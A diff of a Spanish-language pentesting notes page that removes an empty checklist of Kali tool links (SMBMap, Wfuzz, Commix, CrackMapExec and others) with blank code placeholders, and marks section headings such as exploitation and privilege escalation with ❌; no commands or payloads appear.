-*   [ ] SMBMAP👈 --------------------------------->[https://www.kali.org/tools/smbmap/](https://www.kali.org/tools/smbmap/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SMBMAP👈 --------------------------------->[https://www.kali.org/tools/smbmap/](https://www.kali.org/tools/smbmap/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WFUZZ👈 --------------------------------->[https://www.kali.org/tools/wfuzz/](https://www.kali.org/tools/wfuzz/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WFUZZ👈 --------------------------------->[https://www.kali.org/tools/wfuzz/](https://www.kali.org/tools/wfuzz/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] BETTERCAP👈 --------------------------------->[https://www.kali.org/tools/bettercap/ ](https://www.kali.org/tools/bettercap/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/bettercap)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] COMMIX👈 --------------------------------->[https://www.kali.org/tools/commix/](https://www.kali.org/tools/commix/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] COMMIX👈 --------------------------------->[https://www.kali.org/tools/commix/](https://www.kali.org/tools/commix/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SKIP-FISH👈 --------------------------------->[https://www.kali.org/tools/skipfish/](https://www.kali.org/tools/skipfish/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WAPITI👈 --------------------------------->[https://www.kali.org/tools/wapiti/](https://www.kali.org/tools/wapiti/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] ETTERCAP👈 --------------------------------->[https://www.kali.org/tools/ettercap/](https://www.kali.org/tools/ettercap/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WIFITE👈 --------------------------------->[https://www.kali.org/tools/wifite/](https://www.kali.org/tools/wifite/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SPOOFTOOPH👈 --------------------------------->[https://www.kali.org/tools/spooftooph/](https://www.kali.org/tools/spooftooph/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] CRACKMAPEXEC👈 --------------------------------->[https://www.kali.org/tools/crackmapexec/](https://www.kali.org/tools/crackmapexec/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
+        <figure><img src="../../../.gitbook/assets/DOM-XSS.png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -861,7 +447,7 @@
 
 <details>
 
-<summary>🕵️ INVESTIGACION OSINT</summary>
+<summary>🕵️ INVESTIGACION OSINT ❌</summary>
 
 ### INVESTIGACION OSINT
 
@@ -1060,7 +646,7 @@
 
 <details>
 
-<summary>⛓️ HASHES Y DESENCRIPTADOS</summary>
+<summary>⛓️ HASHES Y DESENCRIPTADOS ❌</summary>
 
 ### HASHES Y DESENCRIPTADOS
 
@@ -1287,7 +873,7 @@
 
 <details>
 
-<summary>💪 FUERZA BRUTA A LOGINS</summary>
+<summary>💪 FUERZA BRUTA A LOGINS ❌</summary>
 
 ### FUERZA BRUTA A LOGINS
 
@@ -1451,7 +1037,7 @@
 
 <details>
 
-<summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS</summary>
+<summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS ❌</summary>
 
 ### SCRIPT DE EXPLOIT Y PAYLOADS
 
@@ -1573,7 +1159,7 @@
 
 <details>
 
-<summary>🤯 EXPLOTACION</summary>
+<summary>🤯 EXPLOTACION ❌</summary>
 
 ### EXPLOTACION
 
@@ -1758,7 +1344,7 @@
 
 <details>
 
-<summary>💠 ESCALADA DE PRIVILEGIOS WINDOWS</summary>
+<summary>💠 ESCALADA DE PRIVILEGIOS WINDOWS ❌</summary>
 
 ### ESCALADA DE PRIVILEGIOS WINDOWS
 
@@ -2020,7 +1606,7 @@
 
 <details>
 
-<summary>🐧 ESCALADA DE PRIVILEGIOS LINUX</summary>
+<summary>🐧 ESCALADA DE PRIVILEGIOS LINUX ❌</summary>
 
 ### ESCALADA DE PRIVILEGIOS LINUX
 
@@ -2247,7 +1833,7 @@
 
 <details>
 
-<summary>♻️ PIVOTING</summary>
+<summary>♻️ PIVOTING ❌</summary>
 
 ### PIVOTING
 
